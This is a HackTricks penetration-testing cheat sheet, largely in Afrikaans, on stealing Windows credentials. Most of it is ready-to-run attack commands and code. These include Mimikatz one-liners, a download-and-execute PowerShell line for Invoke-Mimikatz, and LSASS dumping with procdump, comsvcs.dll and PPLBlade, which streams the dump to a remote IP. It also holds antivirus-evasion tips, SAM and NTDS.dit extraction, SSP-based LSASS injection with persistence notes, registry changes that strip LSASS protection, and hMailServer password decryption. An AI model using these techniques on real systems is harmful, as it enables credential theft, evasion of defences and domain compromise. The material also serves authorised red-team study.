# Diefstal van Windows Credentials

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Vind ander dinge wat Mimikatz kan doen in** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Learn about some possible credentials protections here.**](credentials-protections.md) **Hierdie beskermingsmaatreëls kan Mimikatz verhinder om sekere credentials uit te trek.**

## Credentials met Meterpreter

Gebruik die [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **wat** ek geskep het om te **soek na passwords en hashes** binne die slagoffer.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Omseil van AV

### Procdump + Mimikatz

Aangesien **Procdump van** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**'n legitieme Microsoft-instrument is**, word dit nie deur Defender opgespoor nie.\  
Jy kan hierdie tool gebruik om **dump the lsass process**, **download the dump** en **extract** die **credentials locally** vanaf die dump.

Jy kan ook [SharpDump](https://github.com/GhostPack/SharpDump) gebruik.
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Hierdie proses word outomaties gedoen met [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Nota**: Sommige **AV** mag die gebruik van **procdump.exe to dump lsass.exe** as **kwaadwillig** opspoor, dit is omdat hulle die string **"procdump.exe" and "lsass.exe"** opspoor. Dit is dus **meer onopvallend** om as 'n **argument** die **PID** van lsass.exe aan procdump te **gee** **in plaas van** die **naam lsass.exe.**

### Dumping lsass with **comsvcs.dll**

A DLL named **comsvcs.dll** found in `C:\Windows\System32` is responsible for **dumping process memory** in the event of a crash. This DLL includes a **function** named **`MiniDumpW`**, designed to be invoked using `rundll32.exe`.\
Dit maak nie saak wat die eerste twee argumente is nie, maar die derde een is verdeel in drie komponente. Die process ID wat gedump moet word vorm die eerste komponent, die dump-lêer ligging verteenwoordig die tweede, en die derde komponent is streng die woord **full**. Geen alternatiewe opsies bestaan nie.\
Sodra hierdie drie komponente ontleed is, begin die DLL die dump-lêer skep en die geheue van die gespesifiseerde proses na hierdie lêer oorplaas.\
Die gebruik van **comsvcs.dll** is geskik vir die dump van die lsass-proses, wat dus die behoefte om procdump op te laai en uit te voer uitskakel. Hierdie metode word in detail beskryf by [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

Die volgende opdrag word uitgevoer:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Jy kan hierdie proses outomatiseer met** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping lsass with Task Manager**

1. Regsklik op die Taakbalk en klik op Taakbestuurder
2. Klik op Meer besonderhede
3. Soek na die proses "Local Security Authority Process" in die Prosesse-oortjie
4. Regsklik op die proses "Local Security Authority Process" en klik op "Create dump file".

### Dumping lsass with procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) is 'n Microsoft-ondertekende binêre wat deel is van die [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) suite.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass met PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) is 'n Protected Process Dumper Tool wat die obfuskering van memory dump-lêers ondersteun en dit na afgeleë werkstasies kan oordra sonder om dit op die skyf te skryf.

**Belangrike funksies**:

1. Omseiling van PPL-beskerming
2. Obfuskering van memory dump-lêers om Defender se handtekeninggebaseerde opsporingsmeganismes te ontduik
3. Oplaai van memory dump met RAW- en SMB-oplaaimetodes sonder om dit op die skyf te skryf (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-gebaseerde LSASS dumping sonder MiniDumpWriteDump

Ink Dragon stuur 'n drie-fase dumper met die naam **LalsDumper** wat nooit `MiniDumpWriteDump` aanroep nie, sodat EDR hooks op daardie API nooit afskiet:

1. **Stage 1 loader (`lals.exe`)** – soek in `fdp.dll` na 'n plaashouer wat bestaan uit 32 klein letters `d`, oorskryf dit met die absolute pad na `rtu.txt`, stoor die gepatchte DLL as `nfdp.dll`, en roep `AddSecurityPackageA("nfdp","fdp")` aan. Dit dwing **LSASS** om die kwaadaardige DLL as 'n nuwe Security Support Provider (SSP) te laai.
2. **Stage 2 inside LSASS** – wanneer LSASS `nfdp.dll` laai, lees die DLL `rtu.txt`, XOR elke byte met `0x20`, en map die gedekodeerde blob in geheue voordat dit die uitvoering oordra.
3. **Stage 3 dumper** – die gemapte payload implementeer MiniDump-logika opnuut deur gebruik te maak van **direct syscalls** wat opgelos word vanaf gehashte API-name (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). 'n Toegewese export met die naam `Tom` open `%TEMP%\<pid>.ddt`, stroom 'n gecomprimeerde LSASS dump in die lêer, en sluit die hanteer sodat exfiltrasie later kan plaasvind.

Operator notes:

* Hou `lals.exe`, `fdp.dll`, `nfdp.dll`, en `rtu.txt` in dieselfde gids. Stage 1 oorskryf die hard-gekodeerde plaashouer met die absolute pad na `rtu.txt`, so om hulle te skei breek die ketting.
* Registrasie gebeur deur `nfdp` by te voeg tot `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Jy kan daardie waarde self inplant sodat LSASS die SSP by elke opstart herlaai.
* `%TEMP%\*.ddt` lêers is gecomprimeerde dumps. Decomprimeer plaaslik, en voer dit dan aan Mimikatz/Volatility vir credential extraction.
* Om `lals.exe` te draai vereis admin/SeTcb-regte sodat `AddSecurityPackageA` suksesvol is; sodra die oproep terugkeer laai LSASS die rowwe SSP deursigtig en voer Stage 2 uit.
* Die verwydering van die DLL van disk verwyder dit nie uit LSASS nie. Vee óf die registerinskrywing uit en herbegin LSASS (reboot), óf laat dit vir langtermyn persistering.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Dump die NTDS.dit van teiken DC
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Haal die NTDS.dit password history van die target DC af
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Wys die pwdLastSet-attribuut vir elke NTDS.dit-rekening
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Diefstal van SAM & SYSTEM

Hierdie lêers behoort **geleë** te wees in _C:\windows\system32\config\SAM_ en _C:\windows\system32\config\SYSTEM._ Maar **jy kan hulle nie net op 'n gewone manier kopieer nie** omdat hulle beskerm is.

### Vanaf die Register

Die maklikste manier om daardie lêers te steel is om 'n kopie uit die register te kry:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Download** daardie lêers na jou Kali-masjien en **extract the hashes** gebruik:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Jy kan kopieë van beskermde lêers maak met behulp van hierdie diens. Jy moet Administrator wees.

#### Gebruik vssadmin

Die vssadmin binary is slegs beskikbaar in Windows Server-weergawes
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Maar jy kan dieselfde met **Powershell** doen. Dit is 'n voorbeeld van **hoe om die SAM file te kopieer** (die hardeskyf wat gebruik word is "C:" en dit word gestoor in C:\users\Public) maar jy kan dit gebruik om enige beskermde lêer te kopieer:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Kode uit die boek: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Laastens kan jy ook die [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) gebruik om 'n kopie van SAM, SYSTEM en ntds.dit te maak.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Inlogbewyse - NTDS.dit**

Die **NTDS.dit** lêer staan bekend as die hart van **Active Directory**, en bevat noodsaaklike data oor gebruikersobjekte, groepe en hul lidmaatskappe. Dit is waar die **wagwoord-hashes** vir domeingebruikers gestoor word. Hierdie lêer is 'n **Extensible Storage Engine (ESE)** databasis en lê by **_%SystemRoom%/NTDS/ntds.dit_**.

In hierdie databasis word drie primêre tabelle onderhou:

- **Data Table**: Hierdie tabel is verantwoordelik vir die stoor van besonderhede oor objekte soos gebruikers en groepe.
- **Link Table**: Dit hou rekord van verhoudings, soos lidmaatskappe in groepe.
- **SD Table**: **Security descriptors** vir elke object word hier gehou, wat die sekuriteit en toegangsbeheer van die gestoorde objekte verseker.

Meer inligting hieroor: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows gebruik _Ntdsa.dll_ om met daardie lêer te kommunikeer en dit word deur _lsass.exe_ gebruik. Daarom kan 'n deel van die **NTDS.dit** lêer binne die `lsass` geheue gevind word (jy kan waarskynlik die mees onlangs geraadpleegde data vind as gevolg van prestasieverbetering deur gebruik van 'n cache).

#### Ontsleuteling van die hashes binne NTDS.dit

Die hash is drie keer versleutel:

1. Ontsleutel Password Encryption Key (**PEK**) met die **BOOTKEY** en **RC4**.
2. Ontsleutel die hash met **PEK** en **RC4**.
3. Ontsleutel die hash met **DES**.

**PEK** het dieselfde waarde in **every domain controller**, maar dit is **cyphered** binne die **NTDS.dit** lêer deur gebruik van die **BOOTKEY** van die **SYSTEM** lêer van die domain controller (is different between domain controllers). Dit is hoekom om die inlogbewyse uit die NTDS.dit lêer te kry jy die lêers NTDS.dit en SYSTEM benodig (_C:\Windows\System32\config\SYSTEM_).

### Kopieer NTDS.dit met Ntdsutil

Beskikbaar sedert Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Jy kan ook die [**volume shadow copy**](#stealing-sam-and-system) truuk gebruik om die **ntds.dit** lêer. Onthou dat jy ook 'n kopie van die **SYSTEM lêer** benodig (weer, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) truuk).

### **Uittrekking van hashes uit NTDS.dit**

Sodra jy die **NTDS.dit** en **SYSTEM** lêers **verkry** het, kan jy gereedskap soos _secretsdump.py_ gebruik om die **hashes te onttrek**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Jy kan dit ook **outomaties uittrek** deur 'n geldige domain admin user te gebruik:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Vir **groot NTDS.dit-lêers** word dit aanbeveel om dit met [gosecretsdump](https://github.com/c-sto/gosecretsdump) uit te trek.

Laastens kan jy ook die **metasploit module** gebruik: _post/windows/gather/credentials/domain_hashdump_ of **mimikatz** `lsadump::lsa /inject`

### **Uittrekking van domeinobjekte uit NTDS.dit na 'n SQLite-databasis**

NTDS-objekte kan met [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) na 'n SQLite-databasis uitgehaal word. Nie net secrets word onttrek nie, maar ook die volledige objekte en hul eienskappe vir verdere inligtingonttrekking wanneer die rou NTDS.dit-lêer reeds verkry is.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
Die `SYSTEM` hive is opsioneel maar maak ontsleuteling van geheime moontlik (NT & LM hashes, supplemental credentials such as cleartext passwords, kerberos or trust keys, NT & LM password histories). Saam met ander inligting word die volgende data onttrek : gebruikers- en masjienrekeninge met hul hashes, UAC flags, tydstempel vir laaste aanmelding en wagwoordverandering, rekeningbeskrywings, name, UPN, SPN, groepe en rekursiewe lidmaatskappe, boom van organisatoriese eenhede en lidmaatskap, vertroude domeine met trust-tipe, rigting en eienskappe...

## Lazagne

Laai die binary af vanaf [here](https://github.com/AlessandroZ/LaZagne/releases). Jy kan hierdie binary gebruik om credentials uit verskeie sagteware te onttrek.
```
lazagne.exe all
```
## Ander gereedskap om credentials uit SAM en LSASS te onttrek

### Windows credentials Editor (WCE)

Hierdie hulpmiddel kan gebruik word om credentials uit die geheue te onttrek. Laai dit af van: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Onttrek credentials uit die SAM-lêer
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Haal credentials uit die SAM file
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Laai dit af vanaf:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) and just **execute it** and the passwords will be extracted.

## Ontgin onaktiewe RDP-sessies en verswak sekuriteitskontroles

Ink Dragon’s FinalDraft RAT bevat 'n `DumpRDPHistory` tasker waarvan die tegnieke nuttig is vir enige red-teamer:

### DumpRDPHistory-styl telemetrie-insameling

* **Outbound RDP targets** – ontleed elke gebruikershive by `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Elke subkey stoor die servernaam, `UsernameHint`, en die laaste skryf-timestamp. Jy kan FinalDraft se logika met PowerShell replikeer:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – query the `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` log for Event IDs **21** (successful logon) and **25** (disconnect) to map who administered the box:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Sodra jy weet watter Domain Admin gereeld koppel, dump LSASS (met LalsDumper/Mimikatz) terwyl hul **disconnected** sessie nog bestaan. CredSSP + NTLM fallback laat hul verifier en tokens in LSASS, wat dan oor SMB/WinRM herspeel kan word om `NTDS.dit` te kry of persistensie op domain controllers te vestig.

### Registry downgrades targeted by FinalDraft

Dieselfde implant manipuleer ook verskeie registrysleutels om credential theft makliker te maak:
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Stel `DisableRestrictedAdmin=1` dwing volle hergebruik van credentials/tickets tydens RDP af, wat pass-the-hash-styl pivots moontlik maak.
* `LocalAccountTokenFilterPolicy=1` skakel UAC token filtering uit, sodat plaaslike admins onbeperkte tokens oor die netwerk ontvang.
* `DSRMAdminLogonBehavior=2` laat die DSRM-administrator aanmeld terwyl die DC aanlyn is, en gee aanvallers nog 'n ingeboude rekening met hoë privilegies.
* `RunAsPPL=0` verwyder LSASS PPL-beskerming, wat geheuetoegang triviaal maak vir dumpers soos LalsDumper.

## hMailServer databasis-wagwoorde (post-kompromie)

hMailServer stoor sy DB-wagwoord in `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` onder `[Database] Password=`. Die waarde is Blowfish-encrypted met die statiese sleutel `THIS_KEY_IS_NOT_SECRET` en 4-byte word endianness swaps. Gebruik die hex-string uit die INI met hierdie Python-snippet:
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
Met die onversleutelde wagwoord, kopieer die SQL CE-databasis om lêerslotte te vermy, laai die 32-bit provider en opgradeer dit indien nodig voordat jy die hashes opvra:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
Die `accountpassword` kolom gebruik die hMailServer hash-formaat (hashcat mode `1421`). Die kraking van hierdie waardes kan herbruikbare kredensiële vir WinRM/SSH-pivots verskaf.

## LSA Logon Callback Interception (LsaApLogonUserEx2)

Sommige tooling vang **onversleutelde aanmeldwagwoorde** op deur die LSA logon callback `LsaApLogonUserEx2` te onderskep. Die idee is om die authentication package callback te hook of te wrap sodat kredensiële vasgevang word **tydens aanmelding** (voor hashing), en dan na skyf geskryf of aan die operateur teruggegee word. Dit word gewoonlik geïmplementeer as 'n helper wat in LSA inject of by LSA registreer, en dan elke suksesvolle interactive/network aanmeldgebeurtenis opteken met die gebruikersnaam, domein en wagwoord.

Operational notes:
- Vereis lokale admin/SYSTEM-regte om die helper in die authentication path te laai.
- Vasgevangde kredensiële verskyn slegs wanneer 'n aanmelding plaasvind (interactive, RDP, service, of network logon, afhangend van die hook).

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS) stoor gestoorde konneksie-inligting in 'n per-gebruiker `sqlstudio.bin` lêer. Gespesialiseerde dumpers kan die lêer ontleed en gestoorde SQL-kredensiële herstel. In shells wat slegs opdraguitset teruggee, word die lêer dikwels exfiltrated deur dit as Base64 te enkodeer en na stdout te druk.
```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```
Aan die operateurkant, herbou die lêer en hardloop die dumper plaaslik om credentials te herwin:
```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```
## Verwysings

- [Unit 42 – An Investigation Into Years of Undetected Operations Targeting High-Value Sectors](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
